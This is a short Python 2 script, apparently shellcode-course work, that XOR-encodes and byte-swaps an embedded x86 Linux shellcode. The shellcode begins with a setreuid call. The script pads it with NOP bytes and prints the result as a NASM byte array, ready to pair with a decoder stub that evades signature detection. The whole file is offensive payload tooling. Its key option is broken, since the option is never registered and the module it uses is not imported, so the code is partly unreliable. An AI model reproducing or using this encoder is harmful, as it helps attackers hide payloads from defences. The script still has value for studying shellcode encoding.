#!/usr/bin/env python
import sys, getopt, textwrap, struct
from binascii import unhexlify, hexlify

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"

    return 0

def pad(string):
    ret = string + "\x90" * (4-(len(string)%4))
    return ret

def xor(data, key):
    l = len(key)

    decoded = ""
    for i in range(0, len(data)):
            decoded += chr(data[i] ^ ord(key[i % l]))


    return decoded

def xor_str(a,b):
    result = int(a, 16) ^ int(b, 16) # convert to integers and xor them
    return '{:x}'.format(result) 

def swap(x):
    s=x[6:8] + x[4:6] + x[2:4] + x[0:2]
    return s

def main(argv):

    key = ("\xde\xad\xbe\xef")
    shellcode=("\x31\xc9\xf7\xe1\x89\xc3\xb0\x46\xcd\x80\x53\xb8\xef\xbe\xad\xde\x89\xc2\x68\xcb\xcb\x1c\x1a\x68\x34\x12\x2a\xf3\x68\xbe\xad\x98\x12\x40\x58\xf7\xe0\x58\x58\x6b\xc0\x02\x01\xc0\x83\xc0\x03\x50\xb8\x65\xcb\xcd\x24\x6b\xc0\x03\x50\x89\xe3\x31\xc0\xf7\xd0\x66\xb8\x01\xf4\x66\x48\x66\xc1\xf8\x08\xf7\xd0\x89\xca\xcd\x80")

    try:
        opts, args=getopt.getopt(argv, "h", ["help"])
    except getopt.GetoptError:
        help()
        sys.exit(1)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-k', '--key'):
            key=repr(binascii.unhexlify(arg)).strip("'")
    padded_shellcode = pad(shellcode)
    padded_hex=hexlify(padded_shellcode)
    print "after padding:\t" + padded_hex

    shellcode_len=int(len(padded_shellcode))
    print "payload len is:\t"+str(shellcode_len)+" ("+str(hex(shellcode_len))+")"
    ss= '{:x}'.format(shellcode_len)
    shell_len_string = swap(xor_str(ss*4, "deadbeef"))
    print "payload string:\t" + shell_len_string
    

    padded_xor_hex=""
    for i in textwrap.wrap(padded_hex, 8):
        padded_xor_hex+=xor_str(i, "deadbeef")
    print "after_xor:\t" + padded_xor_hex

    padded_xor_swapped=""
    for i in textwrap.wrap(padded_xor_hex, 8):
        padded_xor_swapped+=swap(i)

    print "after swap:\t" + padded_xor_swapped

    final_encoded_payload=shell_len_string +padded_xor_swapped
    print "final payload:\t" + final_encoded_payload

    f=""
    for x in range(0, len(final_encoded_payload), 2):
        f+= "0x"+final_encoded_payload[x:x+2]+", "

    print "NASM:\t\t" + f[:-2]


    return 0

if __name__ == "__main__":
    main(sys.argv[1:])
